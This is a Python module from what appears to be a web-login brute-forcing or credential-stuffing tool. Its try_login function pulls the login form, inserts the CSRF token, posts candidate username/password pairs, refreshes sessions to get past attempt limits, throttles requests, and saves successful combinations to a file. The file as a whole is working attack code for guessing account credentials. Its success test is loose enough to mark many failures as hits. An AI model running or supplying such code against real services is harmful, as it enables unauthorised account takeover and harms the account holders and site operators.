import time
import requests
from typing import Set, Tuple
from utils.files_utils import save_to_file
from utils.info_utils import timestamp
from utils.session_utils import refresh_session, fetch_login_form, extract_csrf
from settings import (
    REDIRECT_URL,
    SUCCESS_FILE_PATH,
    USERNAME_PARAM_STRING,
    PASSWORD_PARAM_STRING,
    CSRF_PARAM_STRING,
    DELAY_BETWEEN_REQUESTS,
    MAX_ATTEMPTS_PER_SESSION,
    WRONG_CREDENTIALS_MESSAGE,
    SUCCESSFUL_LOGIN_MESSAGE,
    red_bold,
    reset_text
)


def try_login(
    session: requests.Session,
    known_success: Set[str],
    username: str,
    password: str,
    attempt_counter: int = 0,
) -> Tuple[bool, int]:
    """
    Attempts to log in to a web service using the provided credentials,
    handling session refreshes and tracking successful logins.

    This function will:
        - Refresh the session if needed.
        - Fetch the login form and prepare the POST payload.
        - Include CSRF token if present.
        - Attempt login and handle HTTP status codes.
        - Save successful login combinations to a file.

    Args:
        session (requests.Session): Active HTTP session used for requests.
        known_success (Set[str]): Set of already successful "username:password" combos.
        username (str): Username to attempt login with.
        password (str): Password to attempt login with.
        attempt_counter (int, optional): Counter for login attempts in the current session. Defaults to 0.

    Returns:
        Tuple[bool, int]:
            - login_successful (bool): True if login succeeded, False otherwise.
            - updated_attempt_counter (int): Incremented attempt counter after this try.

    Raises:
        requests.RequestException: If the HTTP request fails.
        Exception: For any unexpected errors during the login process.
    """
    combo = f"{username}:{password}"

    session, attempt_counter = refresh_session(session, attempt_counter)
    if session is None:
        return False, attempt_counter

    post_url, form_values = fetch_login_form(session)

    payload = {
        USERNAME_PARAM_STRING: username,
        PASSWORD_PARAM_STRING: password,
        "redirect": form_values.get("redirect", REDIRECT_URL),
    }
    csrf_val = extract_csrf(form_values)
    if csrf_val:
        payload[CSRF_PARAM_STRING] = csrf_val

    try:
        resp = session.post(post_url, data=payload, timeout=15)
        session.cookies.update(resp.cookies)
        time.sleep(DELAY_BETWEEN_REQUESTS)

        if resp.status_code in (401, 403):
            print(f"{timestamp()} [*] Session expired, refreshing...")
            session, attempt_counter = refresh_session(
                session, MAX_ATTEMPTS_PER_SESSION
            )
            return False, attempt_counter

        if resp.status_code != 200:
            print(f"{timestamp()} {red_bold}[!] Unexpected status {resp.status_code} for {combo}{reset_text}")
            return False, attempt_counter + 1

        try:
            response_json = resp.json()
        except ValueError:
            print(f"{timestamp()} {red_bold}[!] Non-JSON response for {combo}{reset_text}")
            return False, attempt_counter + 1

        possible_success: bool = any((
            not response_json.get("error"),
            response_json.get("clear"),
            response_json.get("link"),
            WRONG_CREDENTIALS_MESSAGE not in response_json.get("message", ""),
            SUCCESSFUL_LOGIN_MESSAGE in response_json.get("message", "")
        ))

        if possible_success:
            if combo not in known_success:
                save_to_file(SUCCESS_FILE_PATH, combo)
                known_success.add(combo)
            return True, attempt_counter + 1

    except requests.RequestException as e:
        print(f"{timestamp()} {red_bold}[!] Request error for {combo} -> {e}{reset_text}")
    except Exception as e:
        print(f"{timestamp()} {red_bold}[!] Unexpected error for {combo} -> {e}{reset_text}")

    return False, attempt_counter + 1
